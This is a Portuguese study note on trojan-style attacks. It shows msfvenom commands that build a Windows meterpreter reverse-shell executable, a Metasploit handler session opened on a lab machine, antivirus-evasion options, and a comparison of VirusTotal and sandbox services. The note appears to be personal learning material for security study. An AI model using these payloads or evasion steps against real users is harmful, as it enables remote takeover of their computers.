# Ataques com virus, trojans e etc.

- Não é explorada uma vunerabilidade do sistema, mas a falha humana.
- Consiste de enviar um payload à máquina alvo e esperar a sua execução. O payload é executado pelo próprio usuário da máquina alvo.

## msfvenom

O **`msfvenom`** é uma ferramenta do **Metasploit Framework**, usada principalmente para **criar payloads** maliciosos customizados.

O `msfvenom` permite que você:
* **Gere executáveis maliciosos** (ex.: `.exe`, `.apk`, `.elf`, `.ps1`) que, quando executados, dão controle remoto da máquina para o atacante.
* **Incorpore payloads em arquivos existentes** (ex.: PDF, imagem, etc.).
* **Codifique/encode** o payload com diferentes métodos para dificultar detecção por antivírus.
* **Escolha formatos de saída** (binário cru, executável, código fonte em C, Python, Powershell etc.).

### Parâmetros básicos
- -p, --payload [payload] - payload a ser utilizado no ataque
- -l, --list  [module_type] - Listaumtipo de modulo (payloads, encoders, nops, all...)
- -f, --format  [format] - formato de saída (exe, py, rb...)
- -o, --out  [path] - nome do arquivo que conterá o playload

### Criação do payload
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell1.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell1.exe
```

### Listening
Após o payload ser enviado, começamos a escutar a rede, aguardando o pauload ser executado.
- É necessário estar executando o listening antes da execução do playload.

Iniciando a escuta...
```
$ msfconsole
Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  
       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/
```
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
```
msf6 exploit(multi/handler) > show options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
Necessitamos alterar o payload do listenner para o mesmo payload do arquivo executável.
```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
E configurar o IP da máquina de escuta
```
msf6 exploit(multi/handler) > set LHOST 192.168.1.10 
LHOST => 192.168.1.10
```
Verificando uma última vez...
```
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
Tudo certo para iniciar a escuta...
```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:4444
```
### Resultado

Quando executado o payload na máquina alvo, ganhamos acesso à máquina.
```
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] Sending stage (203846 bytes) to 192.168.1.38
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.38:49748) at 2025-09-01 23:12:01 -0300

meterpreter > getuid
Server username: WIN10\user
meterpreter > ls
Listing: C:\Users\user\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  713   fil   2025-09-01 23:04:55 -0300  Desktop.lnk
100666/rw-rw-rw-  1298  fil   2025-09-01 19:40:09 -0300  Settings.lnk
100666/rw-rw-rw-  1520  fil   2025-09-01 19:43:26 -0300  Windows Security.lnk
100666/rw-rw-rw-  282   fil   2025-08-28 20:25:39 -0300  desktop.ini
100777/rwxrwxrwx  7168  fil   2025-09-01 22:37:20 -0300  shell1.exe
```
## Considerações

O **msfvenom** é muito conhecido e portanto, facilmente detectável pelos antivirus. Contudo, existe formas de dificultar a sua detecção. Abaixo algumas delas:
- -n, --nopsled  [length] - Anexa a nops ao payload
- -e, --encoder  [encoder] - o encoder a ser utilizado (x64/zutto_de_kiru...)
- -a, --arch  [architecture] - Arquitetura utilizada (x64...)
- --platform   [platform] - a plataforma do payload (osx, solaris, firefox, linux, windows...)
- -i, --iterations  [count] - número de vezes que o payload será codificado.
-  -x, --template  [path]n - especifica um executável que deverá ser 'imitado'
-  Etc.

## Verificando a detecção

### [VirusTotal](https://www.virustotal.com/)

É um serviço online **gratuito** que analisa arquivos e URLs em busca de **malwares, vírus, trojans, worms, ransomwares e outras ameaças digitais**.

Ele funciona como um **agregador de motores antivírus e ferramentas de segurança**: quando você envia um arquivo ou link, o site o verifica simultaneamente com dezenas de mecanismos de antivírus, além de ferramentas de detecção de comportamento suspeito e bancos de dados de reputação.

*Importante: alimenta as máquinas de antivirus. Se o virus não for detectável, ele é enviado para as empresas de antivirus e logo comporá a base de dados de proteção deles.*

Funções:
1. **Analisar arquivos** → você faz upload de um executável, PDF, imagem, script, etc.
   * O serviço roda esse arquivo em vários mecanismos antivírus (Kaspersky, BitDefender, Avast, etc.).
   * Mostra quais detectaram (ou não) o arquivo como malicioso.
2. **Analisar URLs** → você insere um link (site, IP ou domínio).
   * Verifica se a página está associada a phishing, malware, spam, etc.
3. **Relatórios de reputação** → cada arquivo ou URL ganha um “histórico público” com:
   * Detecções anteriores.
   * Hashes (MD5, SHA1, SHA256).
   * Informações de sandbox (o que o arquivo faz quando é executado).
4. **Integração para pesquisadores** → possui uma **API** que permite automação de análises em pipelines de segurança.

## Principais alternativas ao VirusTotal

Excelente questão 👌

### 1. **Hybrid Analysis** (by CrowdStrike)

* **Foco:** análise comportamental em sandbox.
* Permite enviar arquivos e URLs.
* Mostra relatórios bem detalhados de comportamento (processos, conexões de rede, registro, memória).
* Interface mais técnica que o VirusTotal.
* Tem APIs e integração para Threat Hunting.
  ✅ **Ponto forte:** sandbox avançada.
  ❌ **Limite:** menos motores AV comparados ao VirusTotal.

### 2. **Any.Run**

* **Foco:** sandbox **interativa**.
* Você pode “interagir” com o malware durante a execução (clicar, abrir menus, etc.).
* Suporta Windows, Linux e Android.
* Excelente para estudar **ransomwares** e **trojans bancários**.
  ✅ **Ponto forte:** interação em tempo real.
  ❌ **Limite:** versão gratuita é bem restrita (tempo curto de execução).

### 3. **Joe Sandbox**

* **Foco:** sandbox com **relatórios muito detalhados** (rede, memória, persistência, evasão).
* Analisa Windows, macOS, Android, iOS, Linux.
* Permite integração com SIEM/SOAR.
  ✅ **Ponto forte:** suporte a vários sistemas operacionais.
  ❌ **Limite:** versão gratuita é reduzida e lenta.

### 4. **Metadefender Cloud** (by OPSWAT)

* **Foco:** análise multi-antivírus + sanitização (CDR → Content Disarm & Reconstruction).
* Pode “limpar” arquivos potencialmente maliciosos.
* Mais voltado para empresas que precisam de segurança preventiva em documentos.
  ✅ **Ponto forte:** sanitização de arquivos, além da detecção.
  ❌ **Limite:** sandbox limitada comparado ao Hybrid/Any.Run.

### 5. **Jotti’s Malware Scan**

* **Foco:** multi-antivírus simples, semelhante ao VirusTotal.
* Menos motores AV (cerca de 15, contra 70+ do VirusTotal).
* Interface simples, sem sandbox.
  ✅ **Ponto forte:** rápido e leve.
  ❌ **Limite:** muito mais limitado que o VirusTotal.

### Comparação de eficácia

| Serviço             | Nº de AVs | Sandbox              | Plataformas Suportadas          | Ponto Forte                    | Melhor Uso                                    |
| ------------------- | --------- | -------------------- | ------------------------------- | ------------------------------ | --------------------------------------------- |
| **VirusTotal**      | 70+       | Básica               | Arquivos e URLs                 | Cobertura ampla (hashes e AVs) | Verificação rápida e reputação                |
| **Hybrid Analysis** | \~30      | Avançada             | Windows/Linux/Android           | Relatórios técnicos detalhados | Análise forense e pesquisa                    |
| **Any.Run**         | \~20      | Interativa           | Windows/Linux/Android           | Interação em tempo real        | Estudo de comportamento (ransomware, trojans) |
| **Joe Sandbox**     | \~25      | Avançada e detalhada | Windows/macOS/Linux/Android/iOS | Suporte multiplataforma        | Pesquisa avançada e laboratórios              |
| **Metadefender**    | \~40      | Limitada             | Arquivos, links                 | Sanitização de arquivos (CDR)  | Prevenção em ambientes corporativos           |
| **Jotti**           | \~15      | Não                  | Arquivos                        | Simples e rápido               | Checagem básica                               |




          
